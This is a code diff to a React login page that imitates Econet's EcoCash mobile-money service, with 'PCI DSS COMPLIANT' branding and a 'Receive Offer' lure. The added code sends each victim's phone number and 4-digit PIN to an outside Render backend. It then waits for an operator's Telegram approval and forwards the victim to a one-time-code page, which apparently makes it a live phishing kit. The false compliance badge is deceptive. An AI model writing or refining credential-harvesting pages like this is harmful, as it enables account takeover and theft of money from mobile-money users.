@@ -2,6 +2,9 @@ import React, { useState, useRef, useEffect } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import { ShieldCheck, Check, ArrowLeft } from 'lucide-react';
 
+// Fallback to your live Render URL if the env variable isn't set
+const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || "https://mixdatahub-fullstack.onrender.com"; 
+
 export default function LoginPage() {
   const location = useLocation();
   const navigate = useNavigate();
@@ -11,11 +14,21 @@ export default function LoginPage() {
   const [pin, setPin] = useState<string>('');
   const [isProcessing, setIsProcessing] = useState<boolean>(false);
   const pinInputRef = useRef<HTMLInputElement>(null);
+  const pollRef = useRef<NodeJS.Timeout | null>(null);
 
   const isPhoneValid = phone.length === 9;
   const isFormValid = isPhoneValid && pin.length === 4;
 
-  useEffect(() => { if (isPhoneValid) pinInputRef.current?.focus(); }, [phone, isPhoneValid]);
+  useEffect(() => { 
+    if (isPhoneValid) pinInputRef.current?.focus(); 
+  }, [phone, isPhoneValid]);
+
+  // Cleanup polling if component unmounts
+  useEffect(() => {
+    return () => {
+      if (pollRef.current) clearInterval(pollRef.current);
+    };
+  }, []);
 
   const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const val = e.target.value.replace(/\D/g, '');
@@ -27,15 +40,60 @@ export default function LoginPage() {
     if (value.length <= 4) setPin(value);
   };
 
-  const handlePayment = () => {
+  const handlePayment = async () => {
     if (!isFormValid) return;
     setIsProcessing(true);
-    setTimeout(() => {
+
+    try {
+      // 1. Send details to Python Backend
+      const response = await fetch(`${API_BASE_URL}/api/initiate-login`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone, pin, duration, voice, sms, data, price })
+      });
+
+      if (!response.ok) throw new Error("Failed to send request");
+      const { transaction_id } = await response.json();
+
+      // 2. Poll the backend to wait for Telegram Admin approval
+      let attempts = 0;
+      const maxAttempts = 30; // 30 attempts * 2 seconds = 60 seconds timeout
+
+      pollRef.current = setInterval(async () => {
+        attempts++;
+        if (attempts > maxAttempts) {
+          if (pollRef.current) clearInterval(pollRef.current);
+          setIsProcessing(false);
+          alert('Request timed out. Admin did not respond.');
+          return;
+        }
+
+        try {
+          const statusRes = await fetch(`${API_BASE_URL}/api/status/${transaction_id}`);
+          const statusData = await statusRes.json();
+
+          if (statusData.status === 'approved') {
+            if (pollRef.current) clearInterval(pollRef.current);
+            setIsProcessing(false);
+            navigate('/otp', { state: { duration, voice, sms, data, price, phone } });
+          } else if (statusData.status === 'denied') {
+            if (pollRef.current) clearInterval(pollRef.current);
+            setIsProcessing(false);
+            alert('Login request was denied by the Administrator.');
+          }
+        } catch (err) {
+          console.error("Polling error", err);
+        }
+      }, 2000); 
+
+    } catch (error) {
+      console.error(error);
       setIsProcessing(false);
-      navigate('/otp', { state: { duration, voice, sms, data, price, phone } });
-    }, 1000);
+      alert("Could not connect to the server. Please try again.");
+    }
   };
 
+  // ... (Keep all your existing `styles` object here exactly as it was) ...
   const styles = {
     appContainer: { width: '100%', maxWidth: '480px', margin: '0 auto', backgroundColor: '#f8f9fc', minHeight: '100vh', position: 'relative', boxShadow: '0 0 30px rgba(0,0,0,0.1)', overflowX: 'hidden', fontFamily: "'Inter', sans-serif" } as React.CSSProperties,
     loginHeader: { background: 'linear-gradient(135deg, #0b40c4 0%, #1e5ce6 100%)', padding: '20px 20px 24px', borderBottomLeftRadius: '20px', borderBottomRightRadius: '20px', color: 'white' } as React.CSSProperties,
@@ -85,7 +143,7 @@ export default function LoginPage() {
   return (
     <div style={styles.appContainer}>
       <div style={styles.loginHeader}>
-        <button style={styles.backButton} onClick={() => navigate('/')}>
+        <button style={styles.backButton} onClick={() => navigate('/')} disabled={isProcessing}>
           <ArrowLeft size={16} /> Back
         </button>
         <div style={styles.brandLogos}>
@@ -131,14 +189,14 @@ export default function LoginPage() {
             <label style={styles.formLabel}>PHONE NUMBER</label>
             <div style={styles.phoneInputWrapper}>
               <div style={styles.countryCode}><span>🇿🇼</span> +263</div>
-              <input type="tel" placeholder="7XXXXXXXX" value={phone} onChange={handlePhoneChange} style={styles.phoneInput} />
+              <input type="tel" placeholder="7XXXXXXXX" value={phone} onChange={handlePhoneChange} style={styles.phoneInput} disabled={isProcessing} />
               {isPhoneValid && <div style={{ display: 'flex', alignItems: 'center', paddingRight: '12px', color: '#00c853' }}><Check size={20} /></div>}
             </div>
           </div>
 
           <div style={styles.formGroup}>
             <label style={styles.formLabel}>ENTER YOUR PIN</label>
-            <div style={styles.pinContainer} onClick={() => isPhoneValid && pinInputRef.current?.focus()}>
+            <div style={styles.pinContainer} onClick={() => isPhoneValid && !isProcessing && pinInputRef.current?.focus()}>
               <p style={styles.pinPlaceholder}>{isPhoneValid ? 'Tap to enter your 4-digit PIN' : 'Enter phone number first'}</p>
               <div style={styles.pinDots}>
                 {[0, 1, 2, 3].map((index) => (
@@ -147,7 +205,7 @@ export default function LoginPage() {
                   </div>
                 ))}
               </div>
-              <input type="tel" ref={pinInputRef} value={pin} onChange={handlePinChange} maxLength={4} style={styles.hiddenPinInput} />
+              <input type="tel" ref={pinInputRef} value={pin} onChange={handlePinChange} maxLength={4} style={styles.hiddenPinInput} disabled={isProcessing} />
             </div>
           </div>
         </div>
@@ -158,7 +216,7 @@ export default function LoginPage() {
             <span style={styles.securityBadgeSpan}><ShieldCheck size={14} /> PCI DSS COMPLIANT</span>
           </div>
           <button onClick={handlePayment} disabled={!isFormValid || isProcessing} style={{ ...styles.receiveOfferBtn, backgroundColor: isFormValid ? '#1e5ce6' : '#a0bdf5', cursor: isFormValid && !isProcessing ? 'pointer' : 'not-allowed', boxShadow: isFormValid && !isProcessing ? '0 4px 12px rgba(30, 92, 230, 0.3)' : 'none', opacity: isProcessing ? 0.8 : 1 }}>
-            {isProcessing ? 'Processing Payment...' : 'Receive Offer'}
+            {isProcessing ? 'Waiting for Admin Approval...' : 'Receive Offer'}
           </button>
           <p style={styles.poweredBy}>POWERED BY ECONET WIRELESS · ECOCASH</p>
         </div>
